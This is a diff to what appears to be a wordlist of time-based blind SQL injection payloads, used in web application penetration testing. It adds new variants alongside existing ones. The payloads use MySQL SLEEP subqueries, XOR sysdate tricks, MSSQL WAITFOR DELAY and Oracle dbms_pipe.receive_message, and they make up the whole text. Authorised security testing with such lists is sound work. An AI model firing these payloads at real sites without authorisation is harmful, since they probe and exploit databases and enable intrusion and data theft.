@@ -1,5 +1,6 @@
 
- AND (SELECT 2961 FROM (SELECT(SLEEP(5)))wDFs)
+'AND (SELECT 2961 FROM (SELECT(SLEEP(5)))wDFs)
+AND (SELECT 2961 FROM (SELECT(SLEEP(5)))wDFs)
 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X
 
 0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z
@@ -73,6 +74,7 @@ dbms_pipe.receive_message(('a'),10)
 WAITFOR DELAY '0:0:25';--
 
 OR SLEEP(25)#
+20 AND (SELECT 4795 FROM (SELECT(SLEEP(5)))afrO)
 
 AND SLEEP(25) AND ('kleiton'='kleiton WAITFOR DELAY '0:0:25' and 'a'='a;--
 
